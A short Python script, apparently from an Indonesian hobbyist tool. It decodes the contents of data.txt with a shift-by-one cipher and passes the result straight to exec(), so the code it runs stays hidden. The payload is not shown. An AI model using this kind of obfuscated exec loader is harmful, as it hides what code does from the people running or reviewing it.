from os import system,remove;
from urllib import error
try:
    with open ("data.txt","r") as aa:
        exec ("".join ([chr (int (ff)-1) for ff in aa.read().split ("\n")]))
except (ValueError):exit ("masukan angka gan");
except error.URLError:exit ("aktifin dulu data atau wifinya");
